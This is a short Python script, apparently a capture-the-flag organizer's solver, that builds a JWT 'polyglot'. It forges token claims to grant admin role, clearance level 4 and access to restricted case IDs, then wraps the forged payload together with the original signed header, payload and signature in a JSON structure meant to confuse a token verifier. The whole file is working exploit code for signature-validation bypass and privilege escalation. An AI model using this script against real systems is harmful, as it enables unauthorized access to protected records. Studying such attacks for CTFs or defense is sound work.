#!/usr/bin/env python3
import argparse
import base64
import json

RESTRICTED_CASES = ["CASE-7319", "CASE-4412", "CASE-5827"]


def b64decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def b64encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def build_polyglot(token: str) -> str:
    header, payload, signature = token.strip().split(".", 2)
    original_claims = json.loads(b64decode(payload))

    forged_claims = dict(original_claims)
    forged_claims["role"] = "admin"
    forged_claims["clearance"] = 4
    forged_claims["case_access"] = sorted(
        set(original_claims.get("case_access", [])) | set(RESTRICTED_CASES)
    )

    forged_payload = b64encode(
        json.dumps(forged_claims, separators=(",", ":")).encode()
    )

    return (
        '{" '
        + header
        + "."
        + forged_payload
        + '.":"", "protected":"'
        + header
        + '", "payload":"'
        + payload
        + '","signature":"'
        + signature
        + '"}'
    )


def main():
    parser = argparse.ArgumentParser(description="Organizer-only polyglot builder")
    parser.add_argument("token")
    args = parser.parse_args()
    print(build_polyglot(args.token))


if __name__ == "__main__":
    main()
